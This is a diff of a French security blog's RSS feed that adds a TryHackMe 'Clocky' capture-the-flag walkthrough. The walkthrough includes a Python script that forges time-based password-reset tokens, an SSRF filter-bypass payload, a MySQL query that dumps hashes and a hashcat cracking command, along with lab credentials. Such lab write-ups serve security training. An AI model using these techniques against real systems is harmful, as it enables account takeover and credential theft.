@@ -6,8 +6,209 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>fr</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 05 Apr 2024 16:50:10 -0500</lastBuildDate>
+        <lastBuildDate>Wed, 10 Apr 2024 13:03:18 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/fr/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM: Clocky</title>
+            <link>https://scorpiosec.com/fr/posts/2024/04/thm-clocky/</link>
+            <pubDate>Wed, 10 Apr 2024 13:03:18 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/04/thm-clocky/</guid>
+            <description>Platforme: TryHackMe Lien: Clocky Niveau: Moyen OS: Linux Pour ce défi, notre objectif est de trouver six drapeaux. Notre première étape consiste à examiner le fichier robots.txt qui contient quelques extensions de fichiers. En utilisant ces extensions de fichiers, nous obtenons une archive et en l&amp;rsquo;extrayant, nous obtenons le code source d&amp;rsquo;une application. Après inspection du code, nous identifions un moyen de manipuler le mécanisme de réinitialisation de mot de passe de l&amp;rsquo;application, ce qui nous permet d&amp;rsquo;accéder au tableau de bord administratif.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: TryHackMe</li>
+<li>Lien: <a href="https://tryhackme.com/r/room/clocky" target="_blank" >Clocky</a>
+
+</li>
+<li>Niveau: Moyen</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Pour ce défi, notre objectif est de trouver six drapeaux. Notre première étape consiste à examiner le fichier <code>robots.txt</code> qui contient quelques extensions de fichiers. En utilisant ces extensions de fichiers, nous obtenons une archive et en l&rsquo;extrayant, nous obtenons le code source d&rsquo;une application. Après inspection du code, nous identifions un moyen de manipuler le mécanisme de réinitialisation de mot de passe de l&rsquo;application, ce qui nous permet d&rsquo;accéder au tableau de bord administratif.</p>
+<p>Le tableau de bord présente un formulaire vulnérable au Server-Side Request Forgery (SSRF), ce qui nous permet de nous procurer un fichier contenant des mots de passe. En combinant les noms d&rsquo;utilisateurs que nous énumérons et les mots de passe, nous accédons  au système via SSH.</p>
+<p>Une exploration plus poussée révèle la présence d&rsquo;une base de données mysql; cependant, en essayant de lire le contenu d&rsquo;une de ses tables, on obtient un résultat indéchiffrable causé par le plugin <code>cache_sha2_password</code>. Finalement, en utilisant une requête méticuleusement élaborée, nous réussissons à extraire les hashs des mots de passe dans un format lisible et après les avoir craqués, nous obtenons le mot de passe root.</p>
+<p>Adresse IP cible - <code>10.10.62.39</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Clocky 10.10.62.39
+</code></pre><p><strong>Résultats</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-09 22:51 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.62.39
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.41
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8000/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">3</span> disallowed entries 
+</span></span><span style="display:flex;"><span>|_/*.sql$ /*.zip$ /*.bak$
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 55.02 seconds
+</span></span></code></pre></div><p>Trois ports sont ouverts: 22 (SSH), 80 (HTTP - Apache) et 8000 (HTTP - Nginx). Les deux serveurs web semblent renvoyer un code d&rsquo;état 403.</p>
+<h2 id="flag-1">Flag 1</h2>
+<p>Les adresses <code>http://10.10.62.39/</code> et <code>http://10.10.62.39:8000/</code> renvoient toutes deux <code>403 Fordbidden</code> comme nous avons pu le voir dans nmap.</p>
+<p><img src="/images/THM-Clocky/Apache-403.png" alt="Apache 403 error"></p>
+<p><img src="/images/THM-Clocky/Nginx-403.png" alt="Nginx 403 error"></p>
+<p>Le résultat du scan montre que le service sur le port 8000 a des entrées non autorisées pour <code>robots.txt</code>. En visitant <code>http://10.10.62.39:8000/robots.txt</code>, nous trouvons une liste de ces mêmes entrées et le drapeau 1.</p>
+<p><img src="/images/THM-Clocky/flag1.png" alt="Clocky Flag 1"></p>
+<pre tabindex="0"><code>THM{14b45bb9eefdb584b79063eca6a31b7a}
+</code></pre><hr>
+<h2 id="flag-2">Flag 2</h2>
+<p>L&rsquo;énumération des répertoires sur le premier serveur web avec gobuster est infructueuse, nous passons à ffuf pour trouver les fichiers.</p>
+<p>Les extensions mentionnées dans le fichier <code>robots.txt</code> sont recherchées. Seul <code>.zip</code> renvoie un résultat et nous trouvons <code>index</code>.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://10.10.62.39:8000/FUZZ.zip
+</code></pre><p><img src="/images/THM-Clocky/ffuf-zip.png" alt="File fuzzing results"></p>
+<p>Nous obtenons un fichier appelé <code>index.zip</code> après avoir été à l&rsquo;adresse <code>http://10.10.62.39:8000/index.zip</code> et l&rsquo;extraction de l&rsquo;archive nous donne le drapeau 2.</p>
+<p><img src="/images/THM-Clocky/flag2.png" alt="Clocky Flag 2"></p>
+<pre tabindex="0"><code>THM{1d3d62de34a3692518d03ec474159eaf}
+</code></pre><hr>
+<h2 id="flag-3">Flag 3</h2>
+<p>L&rsquo;archive contient également un fichier python <code>app.py</code>, qui semble être le code source d&rsquo;une application Flask. A la fin du code, nous observons que l&rsquo;application est accessible sur le port <code>8080</code>.</p>
+<p><img src="/images/THM-Clocky/flask-app-8080.png" alt="Flask app on port 8080"></p>
+<p>En naviguant vers <code>http://10.10.62.39:8080/</code>, nous arrivons sur un site web.</p>
+<p><img src="/images/THM-Clocky/clocky-website.png" alt="Clocky website on port 8080"></p>
+<p>Dans le code source, nous trouvons plusieurs points de terminaison tels que:</p>
+<ul>
+<li><code>/administrator</code> qui contient un formulaire de connexion.</li>
+</ul>
+<p><img src="/images/THM-Clocky/administrator.png" alt="Clocky administrator endpoint"></p>
+<ul>
+<li><code>/forgot_password</code> qui permet de réinitialiser un mot de passe après que l&rsquo;utilisateur ait fourni un nom d&rsquo;utilisateur valide.</li>
+</ul>
+<p><img src="/images/THM-Clocky/password-reset.png" alt="Clocky forgot_password endpoint"></p>
+<ul>
+<li><code>/password_reset</code>, ce point d&rsquo;accès mène à une page avec le message <code>Invalid Parameter</code>. Dans le code, nous voyons que nous devons fournir une valeur pour le token.</li>
+</ul>
+<p><img src="/images/THM-Clocky/pwd_reset.png" alt="Clocky forgot_password endpoint"></p>
+<p><img src="/images/THM-Clocky/token-expected.png" alt="Clocky token value expected"></p>
+<p>De plus, la génération du token est soumise à des contraintes de temps. Voici comment elle fonctionne :</p>
+<ul>
+<li>une fois que l&rsquo;application confirme dans la base de données que le nom d&rsquo;utilisateur fourni existe, elle enregistre la date et l&rsquo;heure du serveur et les stocke dans la variable <code>value</code>.</li>
+<li><code>value</code> est ensuite converti en chaîne de caractères et les 4 derniers caractères sont supprimés. Un espace, un point et le nom de l&rsquo;utilisateur en majuscules sont ensuite ajoutés à la chaîne.</li>
+<li>La variable <code>lnk</code> est finalement hachée en utilisant SHA-1 (ce qui n&rsquo;est pas sécurisé).</li>
+</ul>
+<p><img src="/images/THM-Clocky/token-gen-code.png" alt="Clocky token value expected"></p>
+<p>Pour l&rsquo;exploiter, il faut donc</p>
+<ul>
+<li>fournir un nom d&rsquo;utilisateur valide</li>
+<li>synchroniser notre date et notre heure avec celles du serveur</li>
+<li>générer une valeur de token valide</li>
+<li>réinitialiser le mot de passe du compte administrateur</li>
+</ul>
+<p>Nous utilisons le script ci-dessous pour y parvenir.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set the target URL, change the IP acordingly</span>
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.62.39:8080/&#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a POST request to synchronize time</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;administrator&#34;</span>}
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;forgot_password&#34;</span>, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a GET request to fetch the current time</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(base_url)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>    time_pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;The current time is (\d</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">-\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">-\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74"> \d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">:\d</span><span style="color:#e6db74">{2}</span><span style="color:#e6db74">)&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(time_pattern, response<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
+</span></span><span style="display:flex;"><span>        current_time_str <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Synchronized time:&#34;</span>, current_time_str)  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Generate and check valid tokens</span>
+</span></span><span style="display:flex;"><span>        valid_tokens <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ms <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>            ms_str <span style="color:#f92672">=</span> str(ms)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>)  
+</span></span><span style="display:flex;"><span>            token_data <span style="color:#f92672">=</span> current_time_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> ms_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; . &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;administrator&#34;</span><span style="color:#f92672">.</span>upper()
+</span></span><span style="display:flex;"><span>            hashed_token <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(token_data<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;password_reset&#39;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;token&#39;</span>: hashed_token})
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;&lt;h2&gt;Invalid token&lt;/h2&gt;&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Generated token: </span><span style="color:#e6db74">{</span>hashed_token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) 
+</span></span><span style="display:flex;"><span>                valid_tokens<span style="color:#f92672">.</span>append(hashed_token)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Generated tokens:&#34;</span>, valid_tokens) 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error: Could not parse server time from response.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Error: Failed to fetch server response.&#34;</span>)
+</span></span></code></pre></div><p>Nous utilisons <code>administrator</code> pour le nom d&rsquo;utilisateur valide au niveau de <code>/forgot_password</code>.</p>
+<p><img src="/images/THM-Clocky/admin-reset.png" alt="administrator account reset"></p>
+<p>Après avoir exécuté le script, nous recevons une valeur de token que nous ajoutons à <code>/password_reset</code>.</p>
+<p><img src="/images/THM-Clocky/clocky-py.png" alt="python script to generate valid token values"></p>
+<pre tabindex="0"><code>10.10.62.39:8080/password_reset?token=2233b063a0ebf5505e2cf32a7fa79937d9b561ed
+</code></pre><p>La valeur de notre token est correcte et nous sommes capables de réinitialiser le mot de passe de l&rsquo;utilisateur <code>administrator</code>.</p>
+<p><img src="/images/THM-Clocky/pwd-reset-success.png" alt="password reset success"></p>
+<p>En retournant à <code>/dashboard</code>, nous pouvons nous connecter avec <code>administrator:mot_de_passe_choisi</code> et nous obtenons le drapeau 3.</p>
+<pre tabindex="0"><code>THM{ee68e42f755f6ebbcd89439432d7b462}
+</code></pre><p><img src="/images/THM-Clocky/admin-dashboard.png" alt="admin dashboard"></p>
+<hr>
+<h2 id="flag-4">Flag 4</h2>
+<p>Sur le tableau de bord de l&rsquo;administrateur, nous pouvons soumettre une valeur pour <code>Location</code> et télécharger un fichier. Suite à la capture de la requête avec Burp Suite, je peux voir qu&rsquo;elle utilise le paramètre <code>location</code>.</p>
+<p>Il s&rsquo;avère qu&rsquo;il est vulnérable au SSRF.</p>
+<blockquote>
+<p>Le Server-Side Request Forgery (SSRF), traduit en français comme la falsification des requêtes côté serveur, est une vulnérabilité de la sécurité du web. Elle permet à un hacker d’inciter l’application côté serveur à envoyer des requêtes à un endroit non prévu. Avec une attaque SSRF typique, un hacker se sert d’une application web vulnérable pour amener le serveur à interagir afin d’en extraire des fichiers et des données sensibles.  Source - <a href="https://www.cyberuniversity.com/post/ssrf-server-side-request-forgery-quest-ce-que-cest" target="_blank" >Cyberuniversity</a>
+
+</p>
+</blockquote>
+<p>Nous avons accès à une liste de payloads sur <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters" target="_blank" >PayloadsAllTheThings</a>
+
+. J&rsquo;utilise <code>http://127.0.0.1:80</code> mais la tentavive échoue et nous obtenons <code>Action not permitted</code> en réponse, ce qui implique qu&rsquo;il y a un filtre que nous devons contourner.</p>
+<p><img src="/images/THM-Clocky/SSRF.png" alt="SSRF test"></p>
+<p>J&rsquo;ai trouvé une liste de payload pour passer les filtres SSRF <a href="https://highon.coffee/blog/ssrf-cheat-sheet/" target="_blank" >ici</a>
+
+ et le payload <code>http://0x7f000001/</code> fonctionne.</p>
+<p><img src="/images/THM-Clocky/SSRF-payload.png" alt="SSRF working payload"></p>
+<p>Au début du code source, vous pouvez voir le commentaire à propos de <code>datbase.sql</code>. Nous l&rsquo;utilisons comme nom de fichier et nous obtenons le drapeau 4.</p>
+<p><img src="/images/THM-Clocky/db-sql.png" alt="database.sql file comment"></p>
+<p><img src="/images/THM-Clocky/flag4.png" alt="Flag 4"></p>
+<pre tabindex="0"><code>THM{350020dc1a53e50e1e92bac2c35dd0a2}
+</code></pre><p>Après avoir transmis la requête, nous obtenons un fichier appelé <code>file.txt</code>.</p>
+<hr>
+<h2 id="flag-5">Flag 5</h2>
+<p>Le fichier <code>file.txt</code> contient le mot de passe <code>Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> et le nom d&rsquo;utilisateur <code>clocky_user</code>. Le code source mentionne deux autres noms, <code>jane</code> et <code>clarice</code>.</p>
+<p>Après avoir essayé le mot de passe avec les différents utilisateurs, nous arrivons à nous connecter via SSH avec <code>clarice:Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> et à récupérer le drapeau 5.</p>
+<p><img src="/images/THM-Clocky/flag5.png" alt="Flag 5"></p>
+<pre tabindex="0"><code>THM{e57dfa35e62d518cfd215dd7729d0877}
+</code></pre><hr>
+<h2 id="flag-6">Flag 6</h2>
+<p>Dans <code>/home/clarice/app</code> nous trouvons le fichier caché <code>.env</code> qui révèle le mot de passe de la base de données <code>seG3mY4F3tKCJ1Yj</code>.</p>
+<p><img src="/images/THM-Clocky/db-pwd.png" alt="database password"></p>
+<p>Le résultat de <code>ss -lntp</code> confirme que MySQL est installé sur le serveur.</p>
+<p><img src="/images/THM-Clocky/services-intern.png" alt="Internal services running"></p>
+<p>Avec les identifiants <code>clocky_user:seG3mY4F3tKCJ1Yj</code> nous nous connectons à MySQL.</p>
+<pre tabindex="0"><code>mysql -u clocky_user -p
+</code></pre><p>La base de données <code>clocky</code> ne contient que les identifiants de l&rsquo;utilisateur <code>administrator</code>.</p>
+<p>Dans la base de données <code>mysql</code>, nous trouvons une table <code>user</code>.</p>
+<p><img src="/images/THM-Clocky/mysql-db.png" alt="mysql database"></p>
+<p>La requête <code>select * from user</code> produit un résultat illisible.</p>
+<p><img src="/images/THM-Clocky/user-output.png" alt="sql query output"></p>
+<p>Nous voyons que <code>caching_sha2_password</code> qui est un plugin d&rsquo;authentification utilisant sha256 apparaît de façon répétée dans le résultat.</p>
+<p>En recherchant &ldquo;how to dump mysql sha256 hashes with caching_sha2_password?` sur Google, nous trouvons cette <a href="https://github.com/hashcat/hashcat/issues/2305?source=post_page-----10e08ab0f1e9--------------------------------" target="_blank" >hashcat issue page</a>
+
+ où nous pouvons trouver plusieurs requêtes pour atteindre notre objectif.</p>
+<pre tabindex="0"><code>SELECT user, CONCAT(&#39;$mysql&#39;,LEFT(authentication_string,6),&#39;*&#39;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#39;*&#39;)) AS hash FROM user WHERE plugin = &#39;caching_sha2_password&#39; AND authentication_string NOT LIKE &#39;%INVALIDSALTANDPASSWORD%&#39;;
+</code></pre><p><img src="/images/THM-Clocky/hashes-dump.png" alt="hashes dump"></p>
+<p>Le hash du premier utilisateur <code>dev</code> donne le mot de passe <code>armadillo</code>.</p>
+<pre tabindex="0"><code>hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre><p>En utilisant le nouveau mot de passe trouvé, nous nous connectons en tant que root et récupérons le drapeau 6 (le dernier) dans <code>/root</code> !</p>
+<p><img src="/images/THM-Clocky/flag6.png" alt="Flag 6"></p>
+<p>Ce défi était très intéressant et j&rsquo;espère que mon article vous sera utile. Je pense que la connaissance de Python devient de plus en plus précieuse pour les professionnels de la cybersécurité et prendre le temps de l&rsquo;apprendre sera probablement très bénéfique à l&rsquo;avenir. Vous pouvez lire Automate the Boring Stuff with Python par Al Sweigart gratuitement <a href="http://automatetheboringstuff.com/2e/" target="_blank" >ici</a>
+
+.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Codify</title>
